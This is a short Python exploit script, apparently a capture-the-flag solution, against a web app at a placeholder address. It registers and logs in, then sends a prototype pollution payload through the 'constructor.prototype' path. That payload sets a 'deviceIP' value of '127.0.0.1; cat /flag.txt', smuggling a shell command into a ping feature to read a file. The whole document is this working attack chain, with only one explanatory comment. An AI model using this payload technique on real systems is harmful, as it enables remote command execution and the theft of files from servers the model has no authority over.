# Prototype pollution bypasses may require us to pollute the constructor property instead of __proto__ directly
import requests

url = 'http://<ip>:<port>'
headers = {
    "Content-Type" : "application/json"
}

# register
requests.post(f"{url}/register", json={
    "username":"test",
    "password":"test"
}, headers=headers)

# login
headers["Cookie"] = requests.post(f"{url}/login", json={
    "username":"test",
    "password":"test"
}, headers=headers).headers['Set-Cookie']

# prototype pollution 1
requests.post(f"{url}/update", json={
    "constructor":{
        "prototype":{
            "deviceIP":"127.0.0.1; cat /flag.txt"
        }
    }
}, headers=headers)

# get flag
print(requests.get(f"{url}/ping", headers=headers).text)
